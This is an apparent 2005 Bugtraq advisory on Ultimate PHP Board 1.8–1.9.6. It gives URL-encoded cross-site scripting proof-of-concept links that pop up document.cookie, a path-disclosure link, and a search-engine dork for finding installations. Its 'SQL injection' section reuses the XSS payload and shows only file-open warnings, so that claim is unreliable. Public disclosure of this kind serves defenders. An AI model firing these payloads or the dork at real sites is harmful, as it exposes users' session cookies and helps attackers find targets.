
Date: 13 May 2005 13:12:27 -0000
From: Morinex Eneco <m0r1n3x@...il.com>
To: bugtraq@...urityfocus.com
Subject: Ultimate PHP Board (UPB) Security Advisory




# Ultimate PHP Board (UPB) Security Advisory
# By : Morinex
# e-mail : morinex[at]marocmafia com
# date : 13-05-2k5
# shoutz : w00pie.nl - Woopie 



>Target : Ultimate PHP Board (UPB) 
>Vulnerable Versions: v. 1.8 until v 1.9.6
>URL : http://www.myupb.com - http://www.myupb.com/forum/


Tested 

Localhost , Myupb.com.



UPB is a forum/message board script.
It supports threaded discussion with a comprehesivetext database system
that we wrote here at php outburst for the backend.
We are almost at theend of getting rid of all the bugs
associated with developing the forum. We strive of userimput because thats what
really makes a good forum. If you experience any problems with ourforum please submit
a support question on our forum(forum.myupb.com) One of our members will be glad to helpyou out.



Letï¿½s start
- HTML injection

Proof of Concept:
*
http://www.myupb.com/forum/viewforum.php?id=t=123456&postorder=%22%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29%3C%2F%73%63%72%69%70%74%3E%3Cnote%20unescape('=%22%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29%3C%2F%73%63%72%69%70%74%3E%3C')%20==%20'%22%3E&lt;script&gt;alert(document.cookie)&lt;/script&gt;%3C


-SQL injection
Proof of Concept:
*
http://www.myupb.com/forum/viewforum.php?id=123456&postorder=%22%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29%3C%2F%73%63%72%69%70%74%3E%3C

Warning: fopen(./db/123456_sorted.dat): failed to open stream: No such file or directory in /home/pilot/public_html/forum/textdb.inc.php on line 246
Warning: fclose(): supplied argument is not a valid stream resource in /home/pilot/public_html/forum/textdb.inc.php on line 248
1 	

(A remote attacker can inject some SQL tables from textdb.inc.php )

-Full path disclosure

Proof of Concept:

http://www.myupb.com/forum/viewforum.php?id=123456789123456789&postorder=Morinex

Result : No such file or directory in /home/pilot/public_html/forum/textdb.inc.php on line 246

Solution : 
Dont use this f*cking board :)


*Google/Yahoo : "Powered by UPB Version"*


